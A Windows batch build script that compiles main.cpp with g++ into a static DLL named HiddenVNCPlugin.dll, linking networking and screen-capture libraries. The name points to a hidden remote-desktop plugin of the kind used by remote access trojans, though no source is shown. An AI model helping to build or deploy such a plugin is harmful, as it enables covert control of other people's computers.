@echo off
if not exist "build" mkdir build
g++ -O2 -shared main.cpp -o build/HiddenVNCPlugin.dll -lws2_32 -lgdiplus -lgdi32 -luser32 -lole32 -lcomctl32 -luxtheme -ldwmapi -static-libgcc -static-libstdc++ -static
if %errorlevel% neq 0 (
    echo Build failed!
    exit /b %errorlevel%
)
echo Build successful: build/HiddenVNCPlugin.dll
